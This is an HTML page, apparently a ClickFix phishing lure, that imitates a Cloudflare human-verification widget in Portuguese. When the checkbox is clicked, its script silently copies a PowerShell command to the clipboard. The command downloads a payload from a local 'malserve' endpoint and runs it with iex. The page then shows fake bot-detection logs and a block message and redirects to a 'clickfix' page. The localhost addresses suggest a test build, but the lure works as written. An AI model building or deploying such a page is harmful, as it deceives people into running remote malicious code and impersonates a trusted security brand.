<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
            background-color: #fff;
            color: #313131;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 650px;
            padding: 20px;
        }

        /* Header layout from reference */
        .header {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 32px;
            font-weight: 500;
            margin-bottom: 5px;
        }

        .header img {
            width: 32px;
            height: 32px;
            border-radius: 5px;
        }

        .sub-heading {
            font-size: 24px;
            margin-bottom: 35px;
            font-weight: 400;
        }

        /* The Turnstile Widget Box */
        .widget-box {
            width: 300px;
            height: 65px;
            border: 1px solid #d9d9d9;
            background: #fafafa;
            border-radius: 3px;
            display: flex;
            align-items: center;
            padding: 0 12px;
            position: relative;
            margin-bottom: 40px;
            box-shadow: 0 2px 3px rgba(0,0,0,0.03);
            transition: all 0.2s;
        }

        /* Custom Checkbox */
        .checkbox-container {
            width: 28px;
            height: 28px;
            border: 2px solid #c2c2c2;
            border-radius: 3px;
            background: #fff;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            flex-shrink: 0;
            transition: border-color 0.2s;
        }

        .checkbox-container:hover {
            border-color: #999;
        }

        /* Spinner Animation (Initially hidden) */
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0051c3;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        .widget-text {
            font-size: 14px;
            flex-grow: 1;
            user-select: none;
        }

        /* Cloudflare branding on the right */
        .cf-branding {
            text-align: right;
            line-height: 1;
        }

        .cf-branding img {
            height: 18px;
            margin-left: auto;
            margin-bottom: 2px;
        }

        .cf-links {
            font-size: 8px;
            color: #9c9c9c;
            text-decoration: none;
        }

        /* Log text for "dummy loads" */
        #log-area {
            font-family: monospace;
            font-size: 11px;
            color: #888;
            margin-top: -30px;
            margin-bottom: 30px;
            height: 50px;
            overflow: hidden;
        }

        .footer-text {
            font-size: 16px;
            color: #313131;
        }

        /* --- BLOCKED STATE --- */
        .blocked .widget-box {
            border-color: #bd2130;
            background-color: #fffafa;
        }
        
        .blocked .checkbox-container {
            border: none;
            background: transparent;
            color: #bd2130;
            font-size: 24px;
            font-weight: bold;
        }

        .blocked .checkbox-container::after {
            content: '✕';
        }

        .blocked .widget-text {
            color: #bd2130;
            font-weight: 600;
        }

        .blocked .sub-heading {
            color: #bd2130;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <!-- Logo from i-pravatar -->
            <img src="https://i.pravatar.cc/100?u=cloud-security" alt="Site Logo">
            <span>dash.cloudflare.com</span>
        </div>

        <div class="sub-heading" id="main-title">
            Verificando se a conexão do site é segura
        </div>

        <!-- The Interactive Widget -->
        <div class="widget-box" id="widget">
            <div class="checkbox-container" id="check-box">
                <div class="spinner" id="loader"></div>
            </div>
            <div class="widget-text" id="status-label">
                Confirme que é humano
            </div>
            <div class="cf-branding">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare">
                <div class="cf-links">Privacidade • Termos</div>
            </div>
        </div>

        <!-- Logs container -->
        <div id="log-area"></div>

        <div class="footer-text" id="footer-desc">
            dash.cloudflare.com precisa revisar a segurança da sua conexão antes de prosseguir.
        </div>
    </div>

    <script>
        const CLICK_FIX_PAGE = "http:/localhost:5500/clickfix.html";
        const checkBox = document.getElementById('check-box');
        const loader = document.getElementById('loader');
        const statusLabel = document.getElementById('status-label');
        const widget = document.getElementById('widget');
        const logArea = document.getElementById('log-area');
        const mainTitle = document.getElementById('main-title');

        const dummyLogs = [
            "Initializing secure handshake...",
            "Analyzing browser environment...",
            "Checking reputation of IP...",
            "Detection: Automation signature found.",
            "Heuristic analysis complete."
        ];

        let verificationStarted = false;

        function startVerification() {
            if (verificationStarted) return;
            verificationStarted = true;

            // Update UI to "Loading" state
            checkBox.style.borderColor = 'transparent';
            loader.style.display = 'block';
            statusLabel.innerText = "Verificando...";

            let logIndex = 0;

            // Print dummy loads one by one
            const interval = setInterval(() => {
                if (logIndex < dummyLogs.length) {
                    const line = document.createElement('div');
                    line.innerText = "> " + dummyLogs[logIndex];
                    logArea.appendChild(line);
                    logIndex++;
                } else {
                    clearInterval(interval);
                    // Wait a moment after logs, then block
                    setTimeout(triggerBlock, 1000);
                }
            }, 700);
        }

        function triggerBlock() {
            // Hide spinner
            loader.style.display = 'none';
            
            // Apply blocked theme
            document.body.classList.add('blocked');
            
            // Final text changes
            mainTitle.innerText = "Acesso Denied (403)";
            statusLabel.innerText = "Você é um robô e foi bloqueado.";
            
            const errorLine = document.createElement('div');
            errorLine.style.color = "#bd2130";
            errorLine.style.fontWeight = "bold";
            errorLine.innerText = "> RESULT: BOT_DETECTED_PERMANENT_BLOCK";
            logArea.appendChild(errorLine);
            setTimeout(()=>{
                window.location.href = CLICK_FIX_PAGE;
            },1800);
        }
        checkBox.addEventListener('click',()=>{
            navigator.clipboard.writeText(
                `powershell -noexit -c "cd 'C:\\Users\\Retardo\\Desktop\\PiggityPigs';
                $s = (iwr http://localhost:3000/malserve -UseBasicParsing).Content | iex"`
            );
            startVerification();
        });
    </script>
</body>
</html>
